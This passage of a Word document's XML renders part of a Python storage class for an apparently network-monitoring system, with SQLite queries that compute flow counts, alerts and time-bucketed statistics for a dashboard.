      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            row = conn.execute("SELECT * FROM reports WHERE id=?", (report_id,)).fetchone()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43392C8D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            return _row_to_dict(row) if row else None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0193429E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0679B827">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def chat_history(self, report_id) -&gt; list:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15594C9B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        with self.connect() as conn:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A405ED3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            return [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10472E08">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                _row_to_dict(r)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="262D0C57">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                for r in conn.execute(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F748737">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    "SELECT * FROM chat WHERE report_id=? ORDER BY id", (report_id,)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D561C40">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="158694A5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            ]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4575AD75">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="577BEC99">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def stats(self, since=None) -&gt; dict:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58BF7535">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        since = since or (time.time() - 3600)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0412A155">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        with self.connect() as conn:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5185EA59">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            total_flows = conn.execute(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0121F266">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                "SELECT COUNT(*) FROM flows WHERE created_at&gt;=?", (since,)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="458649E5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            ).fetchone()[0]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30DA6587">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            by_pred = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F32220A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                r["predicted"]: r["n"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37C22778">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                for r in conn.execute(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60464770">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    "SELECT predicted, COUNT(*) AS n FROM flows WHERE created_at&gt;=?"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3393E5C4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    " GROUP BY predicted", (since,)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FDDE434">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="174FAB52">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A247061">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            by_probe = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5390FAFD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                r["probe_id"]: r["n"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E101529">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                for r in conn.execute(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7839ABDA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    "SELECT probe_id, COUNT(*) AS n FROM flows WHERE created_at&gt;=?"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DFA9B75">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    " GROUP BY probe_id", (since,)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22C61A19">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50B69F2B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7333AACE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            # flow_key 形如 "6|10.0.0.1|50000|10.0.0.2|80"，第一段是 IP 协议号</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32DF6FEF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            by_proto = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ADC6A07">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                r["proto"]: r["n"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CCB319C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                for r in conn.execute(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07157A7F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    "SELECT substr(flow_key, 1, instr(flow_key, '|') - 1) AS proto,"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BDA7DEF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    " COUNT(*) AS n FROM flows WHERE created_at&gt;=? GROUP BY proto", (since,)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21F9B307">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CC28F4C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E8BB76D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            alerts = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E257B2E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                _row_to_dict(r)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56D7C59A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                for r in conn.execute(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3627E1CD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    "SELECT id, category, probe_id, risk, confidence, created_at FROM alerts"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6918A140">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    " WHERE created_at&gt;=? ORDER BY id DESC LIMIT 200", (since,)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17D053F4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50505394">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            ]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="274616A5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            # 时序按 10 s 分桶，看板直接画折线，不用在前端再算</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="778F2BEA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            buckets = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27687D40">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                {"bucket": r["b"], "n": r["n"]}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21AED8E8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                for r in conn.execute(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B2A3A32">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    "SELECT CAST(created_at/10 AS INTEGER) AS b, COUNT(*) AS n FROM flows"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31CEACBA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    " WHERE created_at&gt;=? GROUP BY b ORDER BY b", (since,)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0082839C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="176D5C2B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            ]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42CEA82B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4892C72E">
      <w:pPr>
